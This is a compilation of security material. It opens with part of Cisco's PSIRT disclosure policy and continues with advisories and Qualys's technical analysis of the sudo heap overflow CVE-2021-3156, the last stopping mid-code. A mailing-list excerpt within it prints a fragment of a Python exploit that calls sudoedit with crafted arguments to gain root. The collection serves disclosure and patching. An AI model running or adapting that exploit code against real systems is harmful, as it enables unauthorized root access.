The Cisco PSIRT works with third-party coordination centers such as the [Computer Emergency Response Team Coordination Center](https://www.kb.cert.org/vuls/) (CERT/CC), [Computer Emergency Response Team of Finland](https://www.kyberturvallisuuskeskus.fi/en/) (CERT-FI), [Japan Computer Emergency Response Team](https://www.jpcert.or.jp/english/) (JP-CERT), and [National Protective Security Authority](https://www.npsa.gov.uk) (NPSA) to manage a coordinated industry disclosure for vulnerabilities reported to Cisco that may impact multiple vendors (for example, a generic protocol issue). In these situations, the Cisco PSIRT will either assist the incident reporter with contacting the coordination center or do so on the incident reporters behalf.

If a reported vulnerability involves a vendor product, the Cisco PSIRT will notify the vendor directly, coordinate with the incident reporter, or engage a third-party coordination center.

The Cisco PSIRT will coordinate with the incident reporter to determine the frequency of status updates on the incident and documentation updates.

In the event that Cisco becomes aware of a vulnerability that does not affect a Cisco product but does involve another vendor's product, Cisco will follow the Cisco [policy for reporting vulnerabilities to vendors](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html).

## Disclosure of Security Vulnerabilities Discovered as Part of Cisco Services Delivery

If a new or previously undisclosed security vulnerability is found during a Cisco Services engagement with a customer, Cisco will follow the [Cisco Product Security Incident Response Process](#cpsirp). Vulnerabilities found in Cisco products and cloud-hosted services will be handled by the Cisco PSIRT according to the [Cisco Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). If the vulnerability is in another vendors product, Cisco will follow the [Cisco Vendor Vulnerability Reporting and Disclosure Policy](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html) unless the affected customer wishes to report the vulnerability to the vendor directly; in that case, Cisco will facilitate contact between the customer and the vendor, and will notify CERT/CC (or its national equivalent).

Cisco will protect customer-specific data at all times throughout this process. Specifically, Cisco will not share any customer-specific data unless directed to do so by the affected customer, or as required by a legal investigation.

### **Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating**

Cisco uses [Version 3.1](https://www.first.org/cvss/v3-1/) of the [Common Vulnerability Scoring System](https://www.first.org/cvss/) (CVSS) as part of its standard process of evaluating reported potential vulnerabilities that do not have a CVE in Cisco products and cloud-hosted services. The CVSS model uses three distinct measurements, or scores, that include Base, Temporal, and Environmental calculations. Cisco will provide an evaluation of the Base vulnerability score and, in some instances, the Temporal vulnerability score. End users are encouraged to compute the Environmental score based on their network parameters. The combination of all three scores should be considered the final score, which represents a moment in time and is tailored to a specific environment. Organizations are advised to use this final score to prioritize responses in their own environments.

**Note:** Cisco began transitioning to CVSS Version 3.1 (CVSSv3.1) in May 2020.

In addition to CVSS scores, Cisco uses the Security Impact Rating (SIR) as a way to categorize vulnerability severity in a simpler manner. The SIR is based on the CVSS Qualitative Severity Rating Scale of the Base score, may be adjusted by PSIRT to account for Cisco-specific variables, and is included in every Cisco Security Advisory. Cisco uses the following guidelines to determine the Cisco Security Advisory type for vulnerabilities in Cisco-authored, customer-managed software. Security Advisories for Critical, High, and Medium SIRs include fixed software information.

| **Publication** | **Type** | **CVSS** | **CVE** | **Fix Information** | **Machine-Readable Format** |
| --- | --- | --- | --- | --- | --- |
| Cisco Security Advisory | Critical | 9.0–10.0 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, Adaptive Security Appliance (ASA), Firepower Threat Defense (FTD), and Firepower Management Center (FMC) Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| High | 7.0–8.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Medium | 4.0–6.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Informational | N/A | No | Fix information in bug (if applicable). | [RSS](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |

Issues with a Low SIR are typically published as a bug Release Note Enclosure (RNE) and not as a Security Advisory.

Cisco reserves the right to deviate from these guidelines in specific cases if additional factors are not properly captured in the CVSS score.

If there is a security issue with a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the third party. In some cases, Cisco may adjust the CVSS score to reflect the impact to the Cisco product.

**Note:** Cisco is a [Common Vulnerabilities and Exposures](https://cve.mitre.org/index.html) (CVE) Numbering Authority and will assign CVE IDs to Cisco software vulnerabilities from the MITRE block of IDs assigned to the company for this purpose. Cisco does not assign CVE IDs for reported vulnerabilities until the vulnerabilities have been confirmed by Cisco. After vulnerabilities are published, Cisco provides CVE details to MITRE for inclusion in its database.

For more information about CVSS, visit [FIRST.org](https://www.first.org/cvss/).
### **Cisco Cloud-Hosted Services**

Cisco offers multiple cloud-hosted services that are used by customers but are maintained, patched, and monitored by Cisco.

The Cisco PSIRT responds to vulnerabilities in Cisco cloud-hosted services and works closely with the teams that operate them. These teams ensure that security vulnerabilities are fixed and patches are deployed to all customer instances in a timely manner.

Typically, service-related security events are communicated to customers by the service teams through direct notification or through the service dashboard or portal. In some instances, Cisco may disclose vulnerabilities through Security Advisories for Cisco cloud-hosted services in coordination with the service teams.

In most cases, no user action is required because Cisco regularly patches cloud-hosted services.

### **Third-Party Software Vulnerabilities**

If there is a vulnerability in a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the component creator. Cisco may adjust the CVSS score to reflect the impact to Cisco products.

Cisco will consider a third-party vulnerability “high profile” if it meets the following criteria:

* The vulnerability exists in a third-party component.
* Multiple Cisco products and/or cloud-hosted services are affected.
* The CVSS score is 5.0 or above.
* The vulnerability has gathered significant public attention.
* The vulnerability is likely to have exploits available and is expected to be, or is being, actively exploited.

For high profile, third-party vulnerabilities, Cisco will begin assessing all potentially impacted products and cloud-hosted services that have not reached the LDoS and publish a Security Advisory within 24 hours after Cisco classifies the vulnerability as high profile. All known affected Cisco products and cloud-hosted services will be detailed in an update to the initial Security Advisory that will be published within 7 days of the initial disclosure. A Cisco bug will be created for each vulnerable product so that registered customers can view them using the Cisco Bug Search Toolkit. Third-party vulnerabilities that are not classified as high profile will be disclosed in a Release Note Enclosure.

### **Cisco Vulnerability Repository**

The [Cisco Vulnerability Repository](https://sec.cloudapps.cisco.com/security/center/cvr) (CVR) is a vulnerability search engine for CVEs reported after 2017 that may impact Cisco products. CVR can help customers understand if their Cisco product is affected by a particular third-party software vulnerability. This tool also displays any Cisco Security Advisories associated with a CVE. At this time, CVR does not include Cisco cloud offers.

### **Vulnerability Exploitability eXchange**

Customers may request a Vulnerability Exploitability eXchange (VEX) document for any CVE in CVR.

### **Types of Security Publications**

In all security publications, Cisco discloses the information required for an end user to assess the impact of a vulnerability and any potential steps needed to protect their environment. Cisco does not provide vulnerability details that could enable someone to craft an exploit. Cisco Security Advisories are point-in-time documents. Information should only be considered up to date as of the time and date of the last publication update as indicated by the "Last Updated" field in the advisory header.

Cisco provides the following types of security-related publications via the [Cisco Security portal](https://www.cisco.com/security) on Cisco.com.

### Cisco Security Advisories

[Cisco Security Advisories](https://sec.cloudapps.cisco.com/security/center/publicationListing.x) provide detailed information about security issues that directly involve Cisco products and cloud-hosted services and require an upgrade, fix, or other customer action. Security Advisories are used to disclose vulnerabilities in Cisco-authored software or in high-profile third-party software with a Critical, High, or Medium SIR. The Cisco PSIRT only validates the affected and fixed version information documented in the advisory.

All Cisco Security Advisories that disclose vulnerabilities with a Critical, High, or Medium SIR include an option to download [Common Security Advisory Framework (CSAF)](https://csaf.io/) content. CSAF is an industry standard designed to depict vulnerability information in machine-readable format. This machine-readable content can be used with other tools to automate the process of interpreting data contained in a Security Advisory. CSAF content can be downloaded directly from each Security Advisory. For more information about CSAF, see the preceding link.

The Informational type of Cisco Security Advisories addresses issues that require a response to information discussed in a public forum, such as a blog or discussion list. Informational advisories are normally published if a third party makes a public statement about a Cisco product vulnerability. Informational advisories may also be used to proactively notify customers about a security-related issue that is not a vulnerability.

### Cisco Event Responses

Cisco [Event Responses](https://sec.cloudapps.cisco.com/security/center/erp.x?i=52) provide information about security events that have the potential for widespread impact on customer networks, applications, and devices. Cisco Event Responses contain summary information, threat analysis, and mitigation techniques that feature Cisco products and cloud-hosted services. They are normally published under the following circumstances:

* If a significant security vulnerability exists in a vendor's product that could affect a Cisco product due to interoperation with the vendor's product or use of the network as a vector for exploitation
* In response to the release of Cisco IOS and IOS XE, Cisco IOS XR, Cisco NX-OS, and Cisco ASA, FTD, and FMC Software bundled publications

### Release Note Enclosures

Release Note Enclosures are used to disclose issues with a Low SIR and most third-party software vulnerabilities. All Cisco bug IDs that are disclosed by Cisco are available for registered customers to view in the [Cisco Bug Search Tool](https://tools.cisco.com/bugsearch/).

If a Cisco Security Advisory references a bug, the bug entry in the Cisco Bug Search Tool will link to the relevant Cisco Security Advisory.

Any Cisco bug that has been evaluated by the Cisco PSIRT includes a "PSIRT Evaluation" section in its Release Note Enclosure. This section includes, where Cisco deems appropriate and relevant, Base and Temporal CVSS scores and a CVE ID. Customers are invited to use this additional information at their discretion and correlate Cisco bugs with industry events. This information is not intended to supplement any standard Cisco warranties applicable to the software as stated in the [Cisco End User License Agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html).

Free software updates will not be provided for issues that are disclosed through a Release Note Enclosure. Customers who wish to upgrade to a software version that includes fixes for those issues should contact their normal support channels. Any exception to this policy will be determined solely at the discretion of Cisco.

The following table summarizes the methods used to notify customers about the aforementioned security publications. Exceptions may be made on a case-by-case basis to increase communication for a given document.

| **Publication** | **Email** | **Security Portal** | **RSS** | **CNS** | **openVuln API** | **Bug Search Tool** |
| --- | --- | --- | --- | --- | --- | --- |
| **Cisco Security Advisory—Critical and High Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Medium Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Informational** | Yes | Yes | Yes | No | No | Yes |
| **Cisco Event Response** | No | Yes | Yes | No | No | No |
| **Release Note Enclosure** | No | No | No | No | No | Yes |

### **Communications Plan**

If one or more of the following conditions exist, Cisco will publicly disclose Cisco Security Advisories:

* The Cisco PSIRT has completed the incident response process and determined that enough software patches or workarounds exist to address the vulnerability, or subsequent public disclosure of code fixes is planned to address high-severity vulnerabilities.
* The Cisco PSIRT has observed active exploitation of a vulnerability that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* There is the potential for increased public awareness of a vulnerability affecting Cisco products and/or cloud-hosted services that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* The Cisco PSIRT has declared a third-party software vulnerability to be "high profile."

All Cisco security publications are disclosed to customers and the public simultaneously.

When coordinating disclosure with third parties, the Cisco PSIRT will attempt to provide notification of any changes to the Cisco PSIRT public disclosure schedule.

As documented in the [Receiving Security Vulnerability Information from Cisco](#rsvifc) section of this document, Cisco delivers technical security information about software fixes in Cisco products and distributes product updates through several channels. Cisco reserves the right to deviate from this policy on an exception basis to ensure access to Cisco.com for software patch availability.

### **Disclosure Schedule**

In direct response to customer feedback, Cisco releases the following bundles of Cisco Security Advisories at 1600 Greenwich Mean Time (GMT) on a regular schedule twice each year. This schedule applies to the disclosure of vulnerabilities in the following Cisco products and does not apply to the disclosure of vulnerabilities in other Cisco products.

| **Cisco Product(s)** | **Release Schedule** |
| --- | --- |
| Cisco NX-OS Software | Fourth Wednesday of February and August |
| Cisco IOS XR Software | Second Wednesday in March and September |
| Cisco IOS and IOS XE Software | Fourth Wednesday in March and September |

### All Other Products

Cisco generally discloses Cisco Security Advisories at 1600 GMT on any given Wednesday.

### Exceptions

Cisco reserves the right to publish an individual Security Advisory for Cisco IOS and IOS XE Software, Cisco IOS XR Software, or Cisco NX-OS Software or other products outside the published schedule. Conditions under which an out-of-cycle publication may occur include, but are not limited to, the following:

* Cisco detects heightened public awareness of a serious vulnerability.
* Cisco learns of active exploitation of a vulnerability.
* Cisco works with a third-party coordination center to publicly disclose a vulnerability.

### **Incident Response Eligibility**

All customers, regardless of contract status, are eligible to receive support from the Cisco TAC for a known or reasonably suspected security vulnerability in Cisco products and services. For more information about how to contact the Cisco TAC, see the [General Security-Related Queries](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#gsrq) section of this document. Customers who contact the Cisco TAC should reference the URL of the Cisco security publication to assist in connecting with the proper support team.

Customers with paid service contracts for incident response and forensic assistance should request assistance through the contact methods specified in their contract.

Cisco, at its sole discretion, may offer customers additional security services free of charge. Cisco reserves the right to determine the type and degree of free assistance it may offer in connection with any incident and to withdraw from such an incident at any time.

### **Security Software Updates**

The Cisco PSIRT will investigate and disclose vulnerabilities in Cisco products and services from the date of First Commercial Shipment (FCS) to the [LDoS](https://www.cisco.com/c/en/us/products/eos-eol-policy.html). Cisco customers with service contracts that entitle them to regular software updates should obtain security fixes through their usual update channels, generally from the Cisco website for the relevant product. Cisco recommends contacting the Cisco TAC only with specific and imminent problems or questions.

As a special customer service, and to improve the overall security of the internet, Cisco may offer customers free software updates to address high-severity security problems. The decision to provide free software updates is made on a case-by-case basis. Refer to the Cisco security publication for details. Free software updates will typically be limited to Critical- and High-severity vulnerabilities.

Fixes for some third-party software vulnerabilities may be available only in the most recent major software releases and not backported to older releases.

If Cisco has offered a free software update to address a specific issue, noncontract customers who are eligible for the update may obtain it by contacting the Cisco TAC using any of the methods described in the [General Security-Related Queries](#gsrq) section of this document.

**Note:** To verify their entitlement, individuals who contact the Cisco TAC should have available the URL of the Cisco document that is offering the update.

Customers may only download, install, and expect support for software releases and feature sets for which they have purchased a valid license that is current and active. By installing, downloading, accessing, or otherwise using such software updates, customers agree to follow the terms of the [Cisco software license agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html). In most cases, the software update will be a maintenance release to software that was previously purchased. Free security software updates do not entitle customers to a new software license, additional software feature sets, or major revision upgrades.

After [End of Sale](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (EoS), the availability of security fixes for vulnerabilities is defined in the product’s EoS bulletin. (See the [End-of-Life Policy](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) for details.) The EoS bulletin may define the Last Day of Support (**LDoS**) milestone, which identifies the last date that Cisco will investigate and disclose product vulnerabilities.

Once the LDoS has been reached, the Cisco PSIRT will continue to accept vulnerability reports but will not analyze, fix, or disclose potential vulnerabilities. To this end, the Cisco PSIRT will not issue CVEs for issues reported on products that are past the LDoS milestone.

### Security Advisory Terms and Conventions

**Fixed Release Availability:** If a future release date is indicated for software, the date provided represents an estimate based on all information known to Cisco as of the "Last Updated" date at the top of the advisory. Availability dates are subject to change based on a number of factors, including satisfactory testing results and delivery of other priority features and fixes. If no version or date is listed for an affected component (indicated by a blank field and/or an advisory designation of Interim), Cisco is continuing to evaluate the fix and will update the advisory as additional information becomes available. After the advisory is marked Final, customers should refer to the associated Cisco bug(s) for further details.

The designated Security Advisory status indicates the following:

**Interim:** The Cisco investigation is ongoing. Cisco will issue revisions to the advisory when additional information, including fixed software release data, becomes available.

**Final:** Cisco has completed its evaluation of the vulnerability described in the advisory. There will be no further updates unless there is a material change in the nature of the vulnerability.

All aspects of this process are subject to change without notice and on a case-by-case basis. No particular level of response is guaranteed for any specific issue or class of issues.

Summary : Allows restricted root access for specified users
Description :
Sudo (superuser do) allows a system administrator to give certain
users (or groups of users) the ability to run some (or all) commands
as root while logging all commands and arguments. Sudo operates on a
per-command basis. It is not a replacement for the shell. Features
include: the ability to restrict what commands a user may run on a
per-host basis, copious logging of each command (providing a clear
audit trail of who did what), a configurable timeout of the sudo
command, and the ability to use the same configuration file (sudoers)
on many different machines.

# sudo: Multiple vulnerabilities — GLSA **202101-33**

Multiple vulnerabilities have been found in sudo, the worst of
which could result in privilege escalation.

### Affected packages

| Package | **app-admin/sudo** on all architectures |
| --- | --- |
| Affected versions | < **1.9.5\_p2** |
| Unaffected versions | >= **1.9.5\_p2** |

### Background

sudo (su “do”) allows a system administrator to delegate authority
to give certain users (or groups of users) the ability to run some (or
all) commands as root or another user while providing an audit trail of
the commands and their arguments.

### Description

Multiple vulnerabilities have been discovered in sudo. Please review the
CVE identifiers referenced below for details.

### Impact

Local users are able to gain unauthorized privileges on the system or
determine the existence of files.

### Workaround

There is no known workaround at this time.

### Resolution

All sudo users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=app-admin/sudo-1.9.5_p2"

```

| | Cisco Security AdvisorySudo Privilege Escalation Vulnerability Affecting Cisco Products: January 2021 High   Advisory ID:  cisco-sa-sudo-privesc-jan2021-qnYQfcM  First Published: 2021 January 29 21:30 GMT  Last Updated:  2021 March 16 20:43 GMT  Version 1.15:  [Final](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#final)   Workarounds:  No workarounds available  CVE-2021-3156     CWE-122          CVE-2021-3156     CWE-122       [Download CSAF](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sudo-privesc-jan2021-qnYQfcM/csaf/cisco-sa-sudo-privesc-jan2021-qnYQfcM.json)   Email      Summary  * A vulnerability in the command line parameter parsing code of Sudo could allow an authenticated, local attacker to execute commands or binaries with root privileges.  The vulnerability is due to improper parsing of command line parameters that may result in a heap-based buffer overflow. An attacker could exploit this vulnerability by accessing a Unix shell on an affected device and then invoking the **sudoedit** command with crafted parameters or by executing a binary exploit. A successful exploit could allow the attacker to execute commands or binaries with root privileges.  This advisory is available at the following link:<https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sudo-privesc-jan2021-qnYQfcM>  Affected Products  * Cisco investigated its product line to determine which products and services may be affected by this vulnerability.  The [Vulnerable Products](#vp) section includes Cisco bug IDs for each affected product. The bugs are accessible through the Cisco Bug Search Tool and contain additional platform-specific information, including workarounds (if available) and fixed software releases.    Vulnerable Products The following table lists Cisco products that are affected by the vulnerability that is described in this advisory. If a future release date is indicated for software, the date provided represents an estimate based on all information known to Cisco as of the Last Updated date at the top of the advisory. Availability dates are subject to change based on a number of factors, including satisfactory testing results and delivery of other priority features and fixes. If no version or date is listed for an affected component (indicated by a blank field and/or an advisory designation of Interim), Cisco is continuing to evaluate the fix and will update the advisory as additional information becomes available. After the advisory is marked Final, customers should refer to the associated Cisco bug(s) for further details. Unless otherwise documented, all software releases prior to the first fixed release are to be considered affected by this vulnerability.       | Product | Cisco Bug ID | [Fixed Release Availability](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#fixes) |   | --- | --- | --- |   | Network Management and Provisioning | | |   | Cisco Elastic Services Controller (ESC) | [CSCvx18712](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvx18712) | ESC-5.4.0.86 (Available) |   | Cisco Prime Collaboration Provisioning | [CSCvx18714](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvx18714) | 12.6.SU3 (Apr 2021) |   | Cisco Prime Service Catalog Virtual Appliance | [CSCvx18724](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvx18724) | See the bug for update information. |   | Cisco Smart Net Total Care - On-Premises | [CSCvx18702](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvx18702) | 2.1.0.1 (Mar 2021) |   | Cisco Smart Software Manager On-Prem | [CSCvx22363](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvx22363) | 8-202102 (Mar 2021) |   | Routing and Switching - Enterprise and Service Provider | | |   | Cisco Nexus 3000 Series Switches | [CSCvx18710](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvx18710) | 7.0(3)I7(9) (Available)19.3.7 (Available)10.1.1 (Available) |   | Cisco Nexus 7000 Series Switches | [CSCvx18709](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvx18709) | 8.4.4 (Available) |   | Cisco Nexus 9000 Series Switches in standalone NX-OS mode | [CSCvx18710](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvx18710) | 7.0(3)I7(9) (Available)19.3.7 (Available)10.1.1 (Available) |   | Cisco Redundancy and Configuration Manager (for 4G/5G StarOS UserPlane) | [CSCvx19139](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvx19139) | 21.23.0 (Mar 2021)21.22.uax (Apr 2021) |   | Unified Computing | | |   | Cisco UCS Director | [CSCvx18705](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvx18705) | 6.8 (Mar 2021) |   | Voice and Unified Communications Devices | | |   | Cisco Paging Server (InformaCast) | [CSCvx18737](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvx18737) | 12.22.1 (Mar 2021)14.0.1 (Mar 2021) |   | Cisco Cloud Hosted Services | | |   | Cisco Common Services Platform Collector | [CSCvx20991](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvx20991) | 2.9.0.2 (Available)See the bug for 2.8 update information. |   | Cisco CX Cloud Agent Software | [CSCvx49685](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvx49685) | 1.3 (Available) |   | Cisco Ultra Cloud | [CSCvx21182](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvx21182) | 2020.02.1.i33 (Mar 2021) |       1.

Sudo before 1.9.5p2 contains an off-by-one error that can result in a
heap-based buffer overflow, which allows privilege escalation to root via
"sudoedit -s" and a command-line argument that ends with a single backslash
character.

Now sudo patches are already deployed widely, so this is how
the NO_ROOT_MAILER flag influenced exploit complexity:

* With "NO_ROOT_MAILER" working using "nss_load_library" method,
e.g. implemented by blasty: main program
<https://github.com/blasty/CVE-2021-3156/blob/main/hax.c>
(140 lines with 18 lines header) and the library to be loaded
<https://github.com/blasty/CVE-2021-3156/blob/main/lib.c>
(16 lines), total 156 lines.

* Without "NO_ROOT_MAILER": love-letter-to-the-baron.py
(43 lines with 18 lines header).

heraldName = '/tmp/XXXXXXXXXXXXXXXXXXXXXXXXX'
heraldFd = os.open(heraldName, os.O_WRONLY|os.O_CREAT|os.O_TRUNC|os.O_NOCTTY)
os.write(
    heraldFd,
    b'#!/bin/sh\ncat <<EOF > /the-letter.txt\nMy dearest Baron,...\n\nWith love,\nX*96\n\nLegal disclaimer:\n\n' + bytes(disclaimer, 'utf8') + b'\nEOF\n')
os.fchmod(heraldFd, 0o755)
os.close(heraldFd)

devNullHandle = os.open('/dev/null', os.O_RDONLY)
letterEnv = {
    'LC_ALL': 'C.UTF-8',
    'LANGUAGE': 'A'*84}
letterArgs = [
    '/usr/bin/sudoedit', '-S', '-s', '\\',
    'X'*96 + heraldName]
process = subprocess.Popen(
    letterArgs, stdin=devNullHandle, env=letterEnv, cwd="/")
process.wait()

Note: I know that line numbers are not a perfect measure for
complexity, it is just a very poor approximation.

I also collected some historic information (software archeology)
on the security-ping-pong around "NO_ROOT_MAILER" feature:
https:///unparalleled.eu/blog/2021/20210215-a-love-letter-to-the-baron-part2/

Kind regads,

Package        : sudo
Version        : 1.8.19p1-2.1+deb9u3
CVE ID         : CVE-2021-3156

The Qualys Research Labs discovered a heap-based buffer overflow
vulnerability in sudo, a program designed to provide limited super user
privileges to specific users. Any local user (sudoers and non-sudoers)
can exploit this flaw for root privilege escalation.

For Debian 9 stretch, this problem has been fixed in version
1.8.19p1-2.1+deb9u3.

We recommend that you upgrade your sudo packages.

For the detailed security status of sudo please refer to its security
tracker page at:
<https://security-tracker.debian.org/tracker/sudo>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

**Update Feb 3, 2021**: It [has been reported](https://twitter.com/hackerfantastic/status/1356645638151303169) that macOS, AIX, and
Solaris are also vulnerable to CVE-2021-3156, and that others may also
still be vulnerable. Qualys has not independently verified the exploit.

**Original Post**: The Qualys Research Team has discovered a heap overflow vulnerability in sudo, a near-ubiquitous utility available on major Unix-like operating systems. Any unprivileged user can gain root privileges on a vulnerable host using a default sudo configuration by exploiting this vulnerability.

Sudo is a powerful utility that’s included in most if not all Unix- and Linux-based OSes. It allows users to run programs with the security privileges of another user. The vulnerability itself has been hiding in plain sight for nearly 10 years. It was introduced in July 2011 (commit 8255ed69) and affects all legacy versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1 in their default configuration.

Successful exploitation of this vulnerability allows any unprivileged user to gain root privileges on the vulnerable host. Qualys security researchers have been able to independently verify the vulnerability and develop multiple variants of exploit and obtain full root privileges on Ubuntu 20.04 (Sudo 1.8.31), Debian 10 (Sudo 1.8.27), and Fedora 33 (Sudo 1.9.2). Other operating systems and distributions are also likely to be exploitable.

As soon as the Qualys research team confirmed the vulnerability, Qualys engaged in responsible vulnerability disclosure and coordinated with sudo’s author and open source distributions to announce the vulnerability.

## Technical Details

If Sudo is executed to run a command in “shell” mode (shell -c command):

* either through the -s option, which sets Sudo’s MODE\_SHELL flag; OR
* through the -i option, which sets Sudo’s MODE\_SHELL and MODE\_LOGIN\_SHELL flags; then, at the beginning of Sudo’s main(), parse\_args() rewrites argv (lines 609-617), by concatenating all command-line arguments (lines 587-595) and by escaping all meta-characters with backslashes (lines 590-591):

```
--------------------------------------------------------------------
571     if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
572         char **av, *cmnd = NULL;
573         int ac = 1;
...
581             cmnd = dst = reallocarray(NULL, cmnd_size, 2);
...
587             for (av = argv; *av != NULL; av++) {
588                 for (src = *av; *src != '\0'; src++) {
589                     /* quote potential meta characters */
590                     if (!isalnum((unsigned char)*src) && *src != '_' && *src != '-' && *src != '$')
591                         *dst++ = '\\';
592                     *dst++ = *src;
593                 }
594                 *dst++ = ' ';
595             }
...
600             ac += 2; /* -c cmnd */
...
603         av = reallocarray(NULL, ac + 1, sizeof(char *));
...
609         av[0] = (char *)user_details.shell; /* plugin may override shell */
610         if (cmnd != NULL) {
611             av[1] = "-c";
612             av[2] = cmnd;
613         }
614         av[ac] = NULL;
615
616         argv = av;
617         argc = ac;
618     }
---------------------------------------------------------------------
```

Later, in sudoers\_policy\_main(), set\_cmnd() concatenates the command-line arguments into a heap-based buffer “user\_args” (lines 864-871) and unescapes the meta-characters (lines 866-867), “for sudoers matching and logging purposes”:

```
--------------------------------------------------------------
819     if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
...
852             for (size = 0, av = NewArgv + 1; *av; av++)
853                 size += strlen(*av) + 1;
854             if (size == 0 || (user_args = malloc(size)) == NULL) {
...
857             }
858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
...
864                 for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
865                     while (*from) {
866                         if (from[0] == '\\' && !isspace((unsigned char)from[1]))
867                             from++;
868                         *to++ = *from++;
869                     }
870                     *to++ = ' ';
871                 }
...
884             }
...
886     }
---------------------------------------------------------------------
```

Unfortunately, if a command-line argument ends with a single backslash character, then:

* at line 866, “from[0]” is the backslash character, and “from[1]” is the argument’s null terminator (i.e., not a space character);
* at line 867, “from” is incremented and points to the null terminator;
* at line 868, the null terminator is copied to the “user\_args” buffer, and “from” is incremented again and points to the first character after the null terminator (i.e., out of the argument’s bounds);
* the “while” loop at lines 865-869 reads and copies out-of-bounds characters to the “user\_args” buffer.

In other words, set\_cmnd() is vulnerable to a heap-based buffer overflow, because the out-of-bounds characters that are copied to the “user\_args” buffer were not included in its size (calculated at lines852-853).

In theory, however, no command-line argument can end with a single backslash character: if MODE\_SHELL or MODE\_LOGIN\_SHELL is set (line 858, a necessary condition for reaching the vulnerable code), then MODE\_SHELL is set (line 571) and parse\_args() already escaped all meta-characters, including backslashes (i.e., it escaped every single backslash with a second backslash).

In practice, however, the vulnerable code in set\_cmnd() and the escape code in parse\_args() are surrounded by slightly different conditions:

```
---------------------------------------------------------------------
819     if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
...
858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
---------------------------------------------------------------------
```

versus:

```
---------------------------------------------------------------------
571     if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
---------------------------------------------------------------------
```

Our question is: can we set MODE\_SHELL and either MODE\_EDIT or MODE\_CHECK (to reach the vulnerable code) but not the default MODE\_RUN (to avoid the escape code)?

The answer, it seems, is no: if we set MODE\_EDIT (-e option, line 361) or MODE\_CHECK (-l option, lines 423 and 519), then parse\_args() removes MODE\_SHELL from the “valid\_flags” (lines 363 and 424) and exits with an error if we specify an invalid flag such as MODE\_SHELL (lines 532-533):

```
---------------------------------------------------------------------
358                 case 'e':
...
361                     mode = MODE_EDIT;
362                     sudo_settings[ARG_SUDOEDIT].value = "true";
363                     valid_flags = MODE_NONINTERACTIVE;
364                     break;
...
416                 case 'l':
...
423                     mode = MODE_LIST;
424                     valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;
425                     break;
...
518     if (argc > 0 && mode == MODE_LIST)
519         mode = MODE_CHECK;
...
532     if ((flags & valid_flags) != flags)
533         usage(1);
---------------------------------------------------------------------
```

But we found a loophole: if we execute Sudo as “sudoedit” instead of “sudo”, then parse\_args() automatically sets MODE\_EDIT (line 270) but does not reset “valid\_flags”, and the “valid\_flags” include MODE\_SHELL by default (lines 127 and 249):

```
---------------------------------------------------------------------
127 #define DEFAULT_VALID_FLAGS     (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)
...
249     int valid_flags = DEFAULT_VALID_FLAGS;
...
